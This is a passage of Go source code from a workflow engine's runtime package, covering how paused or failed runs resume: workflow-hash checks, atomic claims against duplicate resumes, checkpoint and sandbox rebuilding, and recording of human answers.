package runtime

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/SocialGouv/iterion/pkg/backend/delegate"
	"github.com/SocialGouv/iterion/pkg/backend/model"
	"github.com/SocialGouv/iterion/pkg/backend/permission"
	"github.com/SocialGouv/iterion/pkg/dsl/ir"
	"github.com/SocialGouv/iterion/pkg/store"
	"github.com/SocialGouv/iterion/pkg/workspacetrack"
)

// Reserved input keys live in the delegate package (delegate.PriorAskUser*Key
// and delegate.Resume*Key) so runtime and executor can share them without
// either side needing the other's package.

// ---------------------------------------------------------------------------
// Resume — continue a paused run
// ---------------------------------------------------------------------------

// ErrWorkflowSourceChanged is returned when a resume is attempted with a
// workflow hash different from the one persisted at launch. Callers should
// match it with errors.Is rather than parsing the human-readable explanation.
var ErrWorkflowSourceChanged = errors.New("runtime: workflow source has changed")

// IsWorkflowSourceChanged reports whether err is the typed source-change
// refusal. The text fallback is intentionally limited to compatibility
// boundaries that flatten errors to prose (notably detached CLI runners and
// mixed-version deployments); in-process callers retain errors.Is semantics.
func IsWorkflowSourceChanged(err error) bool {
	if errors.Is(err, ErrWorkflowSourceChanged) {
		return true
	}
	return err != nil && strings.Contains(
		strings.ToLower(err.Error()),
		"workflow source has changed",
	)
}

// ValidateResumeWorkflowHash checks whether currentHash is compatible with the
// workflow hash persisted on the run being resumed. Empty hashes are accepted
// for legacy runs/callers that predate source hashing, and force explicitly
// authorizes a mismatch.
//
// This helper is exported so launch frontends can perform the same check
// synchronously before handing a resume to an asynchronous runner. The engine
// still repeats it after acquiring the run lock as a TOCTOU guard.
func ValidateResumeWorkflowHash(runID, persistedHash, currentHash string, force bool) error {
	if persistedHash == "" || currentHash == "" || persistedHash == currentHash || force {
		return nil
	}
	return fmt.Errorf(
		"%w since run %q was started (expected hash %s, got %s); re-run from scratch or use --force",
		ErrWorkflowSourceChanged,
		runID,
		shortWorkflowHash(persistedHash),
		shortWorkflowHash(currentHash),
	)
}

// Resume resumes a paused or failed-resumable run. For paused runs, human
// answers are recorded and execution continues from the human node. For
// failed-resumable runs, execution restarts from the node after the last
// successfully completed one (re-executing the failed node).
func (e *Engine) Resume(ctx context.Context, runID string, answers map[string]any) error {
	r, err := e.store.LoadRun(ctx, runID)
	if err != nil {
		return fmt.Errorf("runtime: load run for resume: %w", err)
	}
	// A worktree run resumes into its persisted workspace (restoreRunEnv),
	// which is only usable while the gitdir its `.git` pointer names still
	// exists. When that linkage is severed, executing nodes there makes
	// deterministic gates read the workspace as "no repo" and return wrong
	// verdicts. Refuse loudly before claiming the run — the status stays
	// resumable and the operator sees the real cause.
	if r.Worktree {
		if linkErr := checkWorktreeLinkage(r.WorkDir); linkErr != nil {
			return fmt.Errorf("runtime: resume run %q: %w", runID, linkErr)
		}
	}
	switch r.Status {
	case store.RunStatusPausedWaitingHuman:
		return e.resumeFromPause(ctx, r, answers)
	case store.RunStatusFailedResumable, store.RunStatusCancelled, store.RunStatusPausedOperator:
		// paused_operator resumes via the same machinery as cancelled
		// runs: checkpoint preserved, no pending interaction, restart
		// from the node about to execute when the pause fired.
		return e.resumeFromFailure(ctx, r)
	case store.RunStatusQueued:
		// Cloud resume: the publisher flips the run to queued BEFORE the
		// message reaches a runner (queue-depth visibility + cooperative-
		// cancel bypass — SubmitResume), so the resumable status that was
		// validated server-side is gone by the time this engine loads the
		// run. A queued status HERE is always a genuine resume: a fresh
		// unclaimed launch reaches Engine.Run (the runner routes msg.Resume
		// == nil there), and validateResumable rejects resuming a plain
		// queued run — so the only way to reach Resume with queued is a
		// publisher-flipped resumable run. Route by evidence: a pending
		// interaction id means a human pause; otherwise resumeFromFailure —
		// which restarts from the checkpoint node, or from entry when a
		// pre-first-node failure (e.g. a runner-side clone-prep error) left
		// no checkpoint at all.
		if r.Checkpoint != nil && r.Checkpoint.InteractionID != "" {
			return e.resumeFromPause(ctx, r, answers)
		}
		return e.resumeFromFailure(ctx, r)
	default:
		return fmt.Errorf("runtime: cannot resume run %q with status %q", runID, r.Status)
	}
}

// checkWorkflowHash validates that the workflow source has not changed since
// the run was started. When forceResume is set, a mismatch is logged as a
// warning instead of causing an error.
func (e *Engine) checkWorkflowHash(r *store.Run) error {
	err := ValidateResumeWorkflowHash(r.ID, r.WorkflowHash, e.workflowHash, e.forceResume)
	if err == nil && e.forceResume && r.WorkflowHash != "" && e.workflowHash != "" && r.WorkflowHash != e.workflowHash {
		if e.logger != nil {
			e.logger.Warn(
				"workflow source has changed since run %q was started (expected %s, got %s); resuming anyway (--force)",
				r.ID,
				shortWorkflowHash(r.WorkflowHash),
				shortWorkflowHash(e.workflowHash),
			)
		}
	}
	return err
}

func shortWorkflowHash(hash string) string {
	if len(hash) > 12 {
		return hash[:12]
	}
	return hash
}

// rebuildArtifacts reconstructs the artifacts map from checkpoint outputs.
func (e *Engine) rebuildArtifacts(outputs map[string]map[string]any) map[string]map[string]any {
	artifacts := make(map[string]map[string]any)
	for nodeID, output := range outputs {
		if n, ok := e.workflow.Nodes[nodeID]; ok {
			if pub := nodePublish(n); pub != "" {
				artifacts[pub] = output
			}
		}
	}
	return artifacts
}

// resumeFromPause resumes a paused run by recording human answers and
// continuing execution from the node after the human checkpoint.
func (e *Engine) resumeFromPause(ctx context.Context, r *store.Run, answers map[string]any) error {
	runID := r.ID
	if err := e.checkWorkflowHash(r); err != nil {
		return err
	}
	if r.Checkpoint == nil {
		return fmt.Errorf("runtime: run %q has no checkpoint", runID)
	}

	cp := r.Checkpoint
	humanNodeID := cp.NodeID
	if cp.Parallel != nil && cp.Parallel.PendingBranchID != "" && cp.Parallel.PendingNodeID != "" {
		return e.resumeParallelPause(ctx, r, cp, answers)
	}

	// A review gate (interaction: review) resumes through a dedicated path:
	// the answers carry a __review_action (reply / approve_merge /
	// force_merge / request_changes), the companion↔human dialogue may
	// re-pause, and approve/force perform a squash-merge during the pause.
	// resumeReviewGate does its own turn recording, claim, rebuild, and
	// action handling, so we return before the single-shot answer machinery.
	if hn, ok := e.workflow.Nodes[humanNodeID].(*ir.HumanNode); ok && hn.Interaction == ir.InteractionReview {
		return e.resumeReviewGate(ctx, r, cp, hn, answers)
	}

	// Coerce string-typed answers (from `iterion resume --answer key=value`,
	// which can only carry strings) into the human node's output-schema
	// types, so a `when <bool>` edge sees true, not "true", and a typed
	// downstream ref sees 5 / [...] not "5" / "[...]". A JSON --answers-file
	// already supplies correctly-typed values, and the studio coerces in
	// the form before POSTing — both are left untouched (only strings are
	// converted).
	answers = e.coerceAnswersToSchema(humanNodeID, answers)

	// An await_answers pause (ADR-081) fans the operator's per-question
	// answers (keyed by interaction ID) out onto the original async
	// interaction records, then substitutes the canonical collected-answers
	// text as the ResumeAnswer. Errors (still-unanswered questions) leave
	// the run paused.
	if refs := delegate.ParseAwaitPending(cp.InteractionQuestions[delegate.AwaitPendingInteractionsKey]); len(refs) > 0 {
		var fanErr error
		answers, fanErr = e.fanOutAwaitAnswers(ctx, runID, humanNodeID, refs, answers)
		if fanErr != nil {
			return fanErr
		}
	}

	// Resolve operator-uploaded files to an openable path. The HTTP layer
	// promoted the bytes to a run attachment and left a descriptor without
	// a `path` — deliberately, because only the engine knows whether the
	// nodes about to read it run on the host or inside a container. Done
	// BEFORE recordHumanAnswers so the persisted interaction, the
	// published artifact and rs.outputs all carry the same resolved
	// descriptor.
	//
	// e.repoRoot is normally set by restoreRunEnv, which runs later inside
	// resumeRebuildState — and the sandbox forecast reads it. Left empty,
	// the DEFAULT `sandbox: auto` resolves to "not applicable (outside a
	// git repository)" and every descriptor gets a host path, moments
	// before startSandbox is handed r.RepoRoot and containerises the run:
	// the path is then real on the host and absent in the container.
	e.seedRepoRootForResume(r)
	e.resolveFileAnswers(ctx, runID, answers)

	// Record answers on the interaction (LoadInteraction + WriteInteraction
	// + emit human_answers_recorded). Fall back to the checkpoint's embedded
	// questions if the interaction file has been deleted.
	if err := e.recordHumanAnswers(ctx, r, cp, answers); err != nil {
		return err
	}

	// Store human answers as the output of the human node. Deep-copy
	// the checkpoint's outputs so subsequent rs.outputs writes do not
	// retroactively mutate the persisted checkpoint object — sibling
	// to the fan-out deep-copy guarantee in commit bb34f844. Initialize
	// when the legacy/Mongo-omitted-shape produces a nil map.
	outputs := copyOutputs(cp.Outputs)
	if outputs == nil {
		outputs = make(map[string]map[string]any)
	}
	outputs[humanNodeID] = answers

	// Persist artifact if the human node has publish, then mark it finished.
	// Pass a CLONE of the checkpoint's version map: materializeHumanArtifact
	// bumps it in place, and the engine mutates it further during the run —
	// both would otherwise write r.Checkpoint's map under a concurrent HTTP read.
	artifactVersions, err := e.materializeHumanArtifact(ctx, runID, humanNodeID, answers, cloneMap(cp.ArtifactVersions))
	if err != nil {
		return err
	}

	// Atomically claim the run (compare-and-set) so a second concurrent
	// resume can't spawn a duplicate execution racing on run.json.
	// RunStatusQueued is a legitimate from-state on the cloud path: the
	// publisher flips the run to queued before the runner claims the
	// resume message (Resume's queued case routed here on the pending
	// interaction evidence). The CAS still serializes concurrent claims.
	// The claim also CONSUMES the pause pointer — see claimForResume.
	if err := e.claimForResume(ctx, r, cp, store.RunStatusPausedWaitingHuman, store.RunStatusQueued); err != nil {
		return err
	}

	// Build runState before edge selection so failures are resumable.
	// Init maps when the checkpoint deserialised with omitted fields
	// (Mongo bson omitempty, legacy stores) — a nil map here would
	// crash selectEdgeRS the first time it tries `rs.loopCounters[X]++`.
	// Restamp here as well as on the failure path: a run resumed from a
	// human pause with `--file X --force` executes the NEW source, and
	// leaving Run.WorkflowSource at the launch text makes the next
	// `rewind --auto` re-report edits that already ran — the same
	// monotonically-growing pivot the failure path restamps to avoid.
	e.restampWorkflowSource(ctx, r)
	rs, sandboxCleanup, rbErr := e.resumeRebuildState(ctx, r, cp, outputs, artifactVersions)
	if rbErr != nil {
		return rbErr
	}
	defer sandboxCleanup()

	// Pin the resume ctx onto runState now. execLoop also does this, but the
	// delegate-pause branch below (cp.BackendName != "") calls reInvokeBackend
	// — which emits events and SaveCheckpoint — BEFORE execLoop ever runs, and
	// the selectEdgeRS error branch calls failRunErrWithCheckpoint. A nil
	// rs.ctx is a no-op on the filesystem store but panics in the MongoDB
	// driver (ctx.Done()) on cloud-mode resumes. Mirrors engine.go's execLoop.
	rs.ctx = ctx

	// When the pause originated from a delegate (an agent/judge that
	// emitted _needs_interaction or called the native ask_user tool),
	// the paused node still owes its work — re-invoke it with the
	// answer merged into the input. Without this branch, the runtime
	// would treat the agent/judge as a finished human node and skip
	// past it, losing the verdict it was supposed to produce.
	if cp.BackendName != "" {
		node, ok := e.workflow.Nodes[humanNodeID]
		if !ok {
			return &RuntimeError{Code: ErrCodeNodeNotFound, NodeID: humanNodeID, Message: fmt.Sprintf("runtime: paused node %q not found in workflow", humanNodeID)}
		}
		ni := &model.ErrNeedsInteraction{
			NodeID:           humanNodeID,
			Questions:        cp.InteractionQuestions,
			SessionID:        cp.BackendSessionID,
			Backend:          cp.BackendName,
			Conversation:     cp.BackendConversation,
			PendingToolUseID: cp.BackendPendingToolUseID,
			SessionStateRef:  cp.BackendSessionStateRef,
		}
		loopErr := e.reInvokeBackend(ctx, rs, humanNodeID, node, ni, answers, 0)
		e.evictRunSessions(runID, loopErr)
		// A delegate-pause resume drives the rest of the graph to a terminal
		// node here, so it needs the SAME worktree finalization the normal
		// edge-select path below performs — otherwise a `worktree: auto` run
		// that paused on an agent/judge ask_user finishes with its commits
		// reachable only via reflog (GC-eligible), the exact F-RT-1 failure
		// finalizeOnExit exists to prevent.
		if wtCtx := e.reconstructWorktreeContext(r); wtCtx != nil {
			e.finalizeOnExit(ctx, runID, wtCtx, nil, loopErr)
		}
		return loopErr
	}

	// CLOSE the stop window for the node that was waiting, before any
	// further execution. The plain human pause reaches neither of the
	// other two closers: the answers become the node's output and control
	// goes straight to the NEXT node, whose own `pre:` boundary is a
	// first one and is therefore captured as `pre:`, not `resume:`.
	//
	// Without this the whole parked window — every file the operator
	// wrote while the run waited for them — is diffed as if it were
	// execution, lands in the scope, and is deleted by a later rewind.
	// Silently, since the bank and the last boundary agree on those
	// files. `interaction: human` is the DEFAULT for a human node and the
	// review gate resumes the same way, so this is the common case, not
	// an edge one.
	e.markPreNodeBoundary(rs, humanNodeID)

	// Select edge from the human node to find the next node.
	nextNodeID, err := e.selectEdgeRS(rs, humanNodeID, answers)
	if err != nil {
		return e.failRunErrWithCheckpoint(rs, humanNodeID, err)
	}

	loopErr := e.execLoop(ctx, rs, nextNodeID)
	e.evictRunSessions(runID, loopErr)
	// Resumed worktree runs need the same persistent-branch + FF step
	// fresh launches get; without this the GC guard never lands and
	// commits are reachable only via reflog. See F-RT-1.
	if wtCtx := e.reconstructWorktreeContext(r); wtCtx != nil {
		e.finalizeOnExit(ctx, runID, wtCtx, nil, loopErr)
	}
	return loopErr
}

// resumeParallelPause answers a human node owned by one fan-out branch, then
// restarts at the router. The durable branch cursors make completed siblings
// return immediately and the answered branch consumes ResumeAnswers exactly
// once before continuing with its private loop counters.
func (e *Engine) resumeParallelPause(ctx context.Context, r *store.Run, cp *store.Checkpoint, answers map[string]any) error {
	runID := r.ID
	humanNodeID := cp.Parallel.PendingNodeID
	branchID := cp.Parallel.PendingBranchID
	answers = e.coerceAnswersToSchema(humanNodeID, answers)
	e.seedRepoRootForResume(r)
	e.resolveFileAnswers(ctx, runID, answers)

	answerCP := *cp
	answerCP.NodeID = humanNodeID
	if err := e.recordHumanAnswers(ctx, r, &answerCP, answers); err != nil {
		return err
	}

	parallel := newParallelExecutionState(cp.Parallel)
	if err := parallel.setResumeAnswers(branchID, answers); err != nil {
		return err
	}
	persisted := *cp
	persisted.Parallel = parallel.snapshot()
	// Persist the consumed answer while the run is still paused. If the
	// process dies immediately after the subsequent claim, orphan recovery
	// still resumes the exact branch instead of asking the question again.
	if err := e.store.PauseRun(ctx, runID, &persisted); err != nil {
		return fmt.Errorf("runtime: persist parallel resume answer: %w", err)
	}
	if err := e.claimForResume(ctx, r, &persisted, store.RunStatusPausedWaitingHuman, store.RunStatusQueued); err != nil {
		return err
	}

	e.restampWorkflowSource(ctx, r)
	outputs := copyOutputs(persisted.Outputs)
	if outputs == nil {
		outputs = make(map[string]map[string]any)
	}
	artifactVersions := cloneMap(persisted.ArtifactVersions)
	if artifactVersions == nil {
		artifactVersions = make(map[string]int)
	}
	rs, sandboxCleanup, err := e.resumeRebuildState(ctx, r, &persisted, outputs, artifactVersions)
	if err != nil {
		return err
	}
	defer sandboxCleanup()
	rs.ctx = ctx

	loopErr := e.execLoop(ctx, rs, persisted.Parallel.RouterNodeID)
	e.evictRunSessions(runID, loopErr)
	if wtCtx := e.reconstructWorktreeContext(r); wtCtx != nil {
		e.finalizeOnExit(ctx, runID, wtCtx, nil, loopErr)
	}
	return loopErr
}

// recordHumanAnswers loads the pending interaction (falling back to the
// checkpoint's embedded questions if the on-disk file is missing), stamps
// the operator's answers + AnsweredAt, writes the interaction back, and
// emits human_answers_recorded. Shared resumeFromPause helper.
func (e *Engine) recordHumanAnswers(ctx context.Context, r *store.Run, cp *store.Checkpoint, answers map[string]any) error {
	runID := r.ID
	interaction, err := e.store.LoadInteraction(ctx, runID, cp.InteractionID)
	if err != nil && cp.InteractionQuestions != nil {
		interaction = &store.Interaction{
			ID:          cp.InteractionID,
			RunID:       runID,
			NodeID:      cp.NodeID,
			RequestedAt: r.UpdatedAt,
			Questions:   cp.InteractionQuestions,
		}
	} else if err != nil {
		return fmt.Errorf("runtime: load interaction for resume: %w", err)
	}
	now := time.Now().UTC()
	interaction.AnsweredAt = &now
	interaction.Answers = answers
	if err := e.store.WriteInteraction(ctx, interaction); err != nil {
		return fmt.Errorf("runtime: write answered interaction: %w", err)
	}
	return e.emit(ctx, runID, store.EventHumanAnswersRecorded, cp.NodeID, map[string]any{
		"interaction_id": cp.InteractionID,
		"answers":        answers,
	})
}

// materializeHumanArtifact persists the human node's answers as a versioned
// artifact (when the node has a publish key), emits node_finished, and
// returns the bumped artifactVersions map. Initializes a fresh map when the
// checkpoint deserialised with a nil/omitted versions field. The
// artifact_written emit is best-effort: the artifact is durably written, so
// emit failures are logged rather than propagated to keep the resume path
// from aborting on observability hiccups.
func (e *Engine) materializeHumanArtifact(ctx context.Context, runID, humanNodeID string, answers map[string]any, artifactVersions map[string]int) (map[string]int, error) {
	humanNode, ok := e.workflow.Nodes[humanNodeID]
	if !ok {
		return nil, &RuntimeError{Code: ErrCodeNodeNotFound, NodeID: humanNodeID, Message: fmt.Sprintf("runtime: human node %q not found in workflow", humanNodeID)}
	}
	if artifactVersions == nil {
		artifactVersions = make(map[string]int)
	}
	if pub := nodePublish(humanNode); pub != "" {
		version := artifactVersions[humanNodeID]
		artifact := &store.Artifact{
			RunID:   runID,
			NodeID:  humanNodeID,
			Version: version,
			Data:    answers,
		}
		if err := e.store.WriteArtifact(ctx, artifact); err != nil {
			return nil, fmt.Errorf("runtime: write human artifact: %w", err)
		}
		artifactVersions[humanNodeID] = version + 1
		// The artifact itself is durably written; the event is
		// observational. Best-effort emit — log the failure so the
		// observability gap is visible rather than swallowing it
		// entirely on the resume path.
		if err := e.emit(ctx, runID, store.EventArtifactWritten, humanNodeID, map[string]any{
			"publish": pub,
			"version": version,
		}); err != nil && e.logger != nil {
			e.logger.Warn("runtime: resume: failed to emit artifact_written for human node %q version %d: %v", humanNodeID, version, err)
		}
	}

	// Mark human node as finished.
	if err := e.emit(ctx, runID, store.EventNodeFinished, humanNodeID, nil); err != nil {
		return nil, err
	}
	return artifactVersions, nil
}

// claimForResume atomically claims a run for resume via a compare-and-set
// on the run status, consumes the pause pointer, then emits run_resumed
// (no data). Returns a clear error when the CAS rejects the transition —
// typically a second concurrent resume racing the first, which we refuse
// rather than spawn a duplicate execution clobbering run.json. The single
// choke point for BOTH human-pause resume paths (single-shot answers and
// the review gate) — a claim without the consumption reopens the
// stale-pointer window on that path alone. The failed-resumable path
// claims via claimForFailureResume because it carries resume-data on the
// emit (its checkpoint holds no pause pointer: failure boundaries never
// set one, and a pause's pointer was consumed by the resume that used it).
func (e *Engine) claimForResume(ctx context.Context, r *store.Run, cp *store.Checkpoint, allowed ...store.RunStatus) error {
	claimed, claimErr := e.store.UpdateRunStatusIf(ctx, r.ID, store.RunStatusRunning, "", allowed)
	if claimErr != nil {
		return fmt.Errorf("runtime: claim run for resume: %w", claimErr)
	}
	if !claimed {
		return fmt.Errorf("runtime: run %q is already being executed (status no longer paused); refusing duplicate resume", r.ID)
	}
	e.consumePausePointer(ctx, r, cp)
	return e.emit(ctx, r.ID, store.EventRunResumed, "", nil)
}

// consumePausePointer clears the interaction evidence off the persisted
// checkpoint right after a resume claim. The checkpoint survives the
// running claim (ADR-095: a status transition never destroys it), so
// leaving the evidence in place would hand a STALE InteractionID to
// Resume's `queued` router after a later park (drain, orphan sweep): that
// re-entry would route back into the pause path and overwrite the
// operator's recorded answers with the retry's empty ones — silently
// crossing the human gate. With the pointer cleared, a park inside this
// window resumes through resumeFromFailure anchored on cp.NodeID: the
// gate re-pauses and re-asks, answers intact.
func (e *Engine) consumePausePointer(ctx context.Context, r *store.Run, cp *store.Checkpoint) {
	if cp == nil || (cp.InteractionID == "" && len(cp.InteractionQuestions) == 0) {
		return
	}
	// The caller's cp stays whole: the delegate-pause and review-gate
	// paths still read its InteractionID in memory.
	consumed := *cp
	consumed.InteractionID = ""
	consumed.InteractionQuestions = nil
	err := e.store.SaveCheckpoint(ctx, r.ID, &consumed)
	if err != nil {
		// One retry: a failed consumption reopens the human-gate window,
		// while aborting here would wedge a run already claimed running.
		err = e.store.SaveCheckpoint(ctx, r.ID, &consumed)
	}
	if err != nil && e.logger != nil {
		e.logger.Error("resume %s: could not clear the consumed pause pointer — a later park may replay interaction %q over the operator's answers: %v", r.ID, cp.InteractionID, err)
	}
	// Align the in-memory run with what is persisted, so a future
	// SaveRun(r) on this path cannot resurrect the pointer.
	r.Checkpoint = &consumed
}

// seedRepoRootForResume fills e.repoRoot from the run record when it has
// not been restored yet, using the same precedence resumeRebuildState
// applies later (r.RepoRoot, else derived from the workspace). Callers
// that need a repo-aware answer BEFORE restoreRunEnv runs — the sandbox
// forecast behind attachmentPath — must call this first; it is a no-op
// once the value is set.
func (e *Engine) seedRepoRootForResume(r *store.Run) {
	if e == nil || e.repoRoot != "" || r == nil {
		return
	}
	if r.RepoRoot != "" {
		e.repoRoot = r.RepoRoot
		return
	}
	workDir := r.WorkDir
	if workDir == "" {
		workDir = e.workDir
	}
	e.repoRoot = engineRepoRoot(workDir)
}

// resumeRebuildState restores the per-run environment, re-mirrors bundle
// skills, re-bootstraps the sandbox, and rebuilds the in-memory runState
// from the checkpoint. Shared by resumeFromPause and resumeReviewGate —
// both resume a paused run and must reconstruct identical execution state.
//
// Returns the runState plus a sandbox-cleanup func the caller MUST defer.
// On a sandbox-start failure it persists failed_resumable (PRESERVING the
// rich checkpoint so the next resume doesn't restart from entry) and
// returns the error with a nil runState and a no-op cleanup.
func (e *Engine) resumeRebuildState(ctx context.Context, r *store.Run, cp *store.Checkpoint, outputs map[string]map[string]any, artifactVersions map[string]int) (*runState, func(), error) {
	runID := r.ID
	humanNodeID := cp.NodeID

	// Clone (not alias) the counter maps: the engine mutates them in place
	// during the resumed run, so aliasing r.Checkpoint's maps would race a
	// concurrent HTTP read of the run pointer. cloneMap(nil) returns nil,
	// so fall back to a fresh map — a nil map would crash selectEdgeRS the
	// first time it does `rs.loopCounters[X]++`.
	loopCounters := cloneMap(cp.LoopCounters)
	if loopCounters == nil {
		loopCounters = make(map[string]int)
	}
	roundRobinCounters := cloneMap(cp.RoundRobinCounters)
	if roundRobinCounters == nil {
		roundRobinCounters = make(map[string]int)
	}

	// Restore the per-run env (workDir + executor wiring) before the
	// runState is built so re-resolved vars use the right PROJECT_DIR.
	// See restoreRunEnv for the rationale; in particular cp.Vars is
	// NOT used as the source of truth — re-resolving from r.Inputs
	// ensures any post-launch engine fix (env-expansion, new var
	// defaults) applies on resume too.
	e.restoreRunEnv(r)

	// Re-mirror bundle skills on resume so a `.botz` upgrade between
	// the original launch and the resume picks up the new skill bodies
	// inside <workDir>/.claude/skills/. Without this, an agent inside
	// a resumed paused run reads the v0.1.0 skill content even though
	// the host has v0.2.0 — the marker file logic preserves any user
	// customisation. See F-RT-7.
	ClearSkillTierMarkers(e.workDir)
	ownedSkills, err := mirrorBundleSkills(e.workDir, e.bundle, e.logger)
	if err != nil {
		return nil, nil, fmt.Errorf("runtime: bundle skills (resume): %w", err)
	}
	ownedPluginSkills, err := mirrorPluginContributions(e.workDir, e.contributions, e.logger)
	if err != nil && e.logger != nil {
		e.logger.Warn("runtime: plugin contributions (resume): %v", err)
	}
	ownedSkills = append(ownedSkills, ownedPluginSkills...)
	if err := mergePluginHooks(e.workDir, e.logger); err != nil && e.logger != nil {
		e.logger.Warn("runtime: plugin hooks (resume): %v", err)
	}
	// Re-apply the preset's "## Focus" bias + skill hints on resume so a
	// paused run that resumes keeps running as the selected sous-bot.
	e.applyMirroredSkills(append(ownedSkills, e.applyLibrarySkills()...))
	e.applyPresetFocus()

	// Re-bootstrap the sandbox container (see resumeFromFailure for the
	// rationale — same lifecycle issue applies here: the original Run()
	// deferred shutdown when it exited to pause, so e.sandbox is nil
	// on resume and tool nodes downstream of the human would fall back
	// to host execution).
	repoRoot := r.RepoRoot
	if repoRoot == "" {
		repoRoot = engineRepoRoot(e.workDir)
	}
	sandboxCleanup, sbErr := e.startSandbox(ctx, runID, repoRoot, resolveWorktreeGitDir(repoRoot, r.WorkDir), r.Inputs)
	if sbErr != nil {
		return nil, nil, e.parkResumeSandboxFailure(ctx, runID, r.Checkpoint, humanNodeID, sbErr)
	}

	rs := e.newRunState(runID, r.Inputs)
	rs.vars = e.resolveVars(r.Inputs)
	// Attachments are otherwise loaded only by runInitState, on the LAUNCH
	// path — leaving {{attachments.<name>}} unresolvable for every node a
	// resumed run executes. That is fatal for a gate upload, which by
	// construction exists only after a resume, and silently degrades
	// launch-time attachments on any resumed run. Loaded here, after
	// startSandbox, so attachmentPath reads the settled sandbox state.
	rs.attachments = e.loadAttachmentInfos(ctx, runID)
	rs.outputs = outputs
	rs.artifacts = e.rebuildArtifacts(outputs)
	rs.loopCounters = loopCounters
	rs.roundRobinCounters = roundRobinCounters
	rs.artifactVersions = artifactVersions
	rs.nodeAttempts = restoreNodeAttempts(cp.NodeAttempts)
	rs.nodeSessions = cloneNodeSessions(cp.NodeSessions)
	if rs.nodeSessions == nil {
		rs.nodeSessions = make(map[string]store.NodeSessionSlot)
	}
	rs.pauseSessionRef = cp.BackendSessionStateRef
	if cp.Parallel != nil {
		rs.parallel = newParallelExecutionState(cp.Parallel)
	}
	restoreLoopSnapshots(rs, cp)
	restoreBudgetAccounting(rs, cp)
	restoreSelectedIncoming(rs, cp)
	restoreRunEvents(rs, cp)
	// Do not EvictRun here: pause-resume must keep in-process claw
	// message history (evictRunSessions already skips ErrRunPaused).
	// Re-apply live-steering grants (bump_loop / raise_budget) persisted
	// on the run record, so a bumped ceiling survives the resume.
	e.applySteeringState(rs, r)

	// Push the freshly-resolved vars into the executor so substitutions
	// in tool commands and prompt templates see the same map the engine
	// just built.
	e.pushExecutorVars(rs.vars)

	// This runState came from a RESUME, so its first workspace boundary
	// closes the window in which the run was stopped. An empty
	// lastWorkspaceSnapshot is NOT proof of that on its own: two mid-run
	// paths clear it too (after every special dispatch, and after a
	// failed capture), and with a colliding loop-iteration label either
	// would otherwise mint a spurious `resume:` boundary and launder real
	// production out of a rewind's scope.
	rs.resumed = true

	return rs, sandboxCleanup, nil
}

// parkResumeSandboxFailure records a sandbox-start failure met on a
// resume arm — the one place both arms (pause, failure) write it, so a
// resumed run's park cannot drift from a launched run's.
//
// The run stays RESUMABLE whatever the cause: a stale container, a
// docker hiccup, an image-pull race clear from the operator's side, and
// a terminal `failed` would force a fresh launch that loses every
// committed node. The rich checkpoint is PRESERVED (outputs, loop
// counters, artifact versions) — a NodeID-only stub would wipe
// everything the bot accumulated and restart the next resume from the
// entry; fallbackNode only serves a run that never earned one.
//
// The cause is TYPED through the classification the launch path uses
// (setupFailureStatus), so the runner's retry lane reads a resumed run
// exactly as a launched one: a sandbox phase timeout lands as
// SANDBOX_SETUP_TIMEOUT (a redelivery to a fresh pod routinely clears
// the stall), a drain as INTERRUPTED. An operator cancel is honoured as
// `cancelled` with the checkpoint kept — the same CAS shape the node
// loop uses, so a reason the publisher already recorded is never
// overwritten. Every write is loud on failure: a park that does not
// land leaves the run `running` until the orphan reconcile catches it,
// and that must be said, not swallowed.
//
// The writes ride a DETACHED, bounded context: on the cancel and drain
// arms the run ctx is the very ctx that was just cancelled, and a store
// that honours it (Mongo) would refuse every write — the run would read
// `running` forever with the park logged as "context canceled". Same
// convention as the node loop's handleContextDoneWithCheckpoint and the
// launch path's markFailedBestEffort.
//
// The returned error is what the runner classifies, so it carries the
// same sentinel the status carries — ErrRunCancelled for an operator
// cancel (acked, never redelivered), ErrRunInterrupted for a drain
// (naked, exempt from the DLQ park), the driver's own sandbox.ErrPhaseTimeout
// for a stall (naked with a delay) — mirroring setupErr on the launch
// path. A bare wrap would read as a generic failure: an operator cancel
// burning a delivery, a drain parked on the DLQ.
func (e *Engine) parkResumeSandboxFailure(ctx context.Context, runID string, cp *store.Checkpoint, fallbackNode string, sbErr error) error {
	if cp == nil {
		cp = &store.Checkpoint{NodeID: fallbackNode}
	}
	status, msg, code := setupFailureStatus(ctx, "sandbox start", sbErr)
	writeCtx, cancelWrite := context.WithTimeout(context.WithoutCancel(ctx), 5*time.Second)
	defer cancelWrite()
	if status == store.RunStatusCancelled {
		if err := e.store.SaveCheckpoint(writeCtx, runID, cp); err != nil && e.logger != nil {
			e.logger.Warn("runtime: resume: save checkpoint on cancel during sandbox start for run %s: %v", runID, err)
		}
		changed, err := e.store.UpdateRunStatusIfCoded(writeCtx, runID, store.RunStatusCancelled, msg, code,
			[]store.RunStatus{store.RunStatusRunning})
		if err != nil && e.logger != nil {
			e.logger.Warn("runtime: resume: could not record the cancel during sandbox start for run %s: %v — run left non-terminal", runID, err)
		} else if !changed && e.logger != nil {
			e.logger.Warn("runtime: resume: cancel during sandbox start for run %s not recorded — the doc had already left `running` (a publisher or peer wrote its terminal status first; that recorded reason stands)", runID)
		}
		return fmt.Errorf("%w: sandbox start: %v", ErrRunCancelled, sbErr)
	}
	if err := e.store.FailRunResumable(writeCtx, runID, cp, msg, code); err != nil {
		// Fall back to a plain terminal status so the run does not linger
		// as `running`; if THAT fails too the run is stuck non-terminal
		// (an orphan the operator must hand-hack), so say so.
		if uerr := e.store.UpdateRunStatusCoded(writeCtx, runID, store.RunStatusFailed, msg, code); uerr != nil && e.logger != nil {
			e.logger.Warn("runtime: resume: could not finalize run %s after sandbox failure (FailRunResumable: %v; UpdateRunStatus fallback: %v) — run left non-terminal", runID, err, uerr)
		}
	}
	if code == store.FailureInterrupted {
		return fmt.Errorf("%w: sandbox start: %v", ErrRunInterrupted, sbErr)
	}
	return fmt.Errorf("runtime: sandbox: %w", sbErr)
}

// resumeFromFailure resumes a failed_resumable run by re-executing from
// the failing node (with checkpoint) or by restarting from the workflow
// entry node (no checkpoint). The "no checkpoint" path matters when a
// run failed on its very first node before any save_checkpoint fired —
// network cuts during plan, claude_code subprocess crashes, etc. Without
// it, those runs are dead-on-arrival because validateResumable lets
// them through but the engine refuses to resume.
func (e *Engine) resumeFromFailure(ctx context.Context, r *store.Run) error {
	runID := r.ID
	if err := e.checkWorkflowHash(r); err != nil {
		return err
	}

	cp := r.Checkpoint
	restartNodeID := e.workflow.Entry
	if cp != nil {
		restartNodeID = cp.NodeID
	}

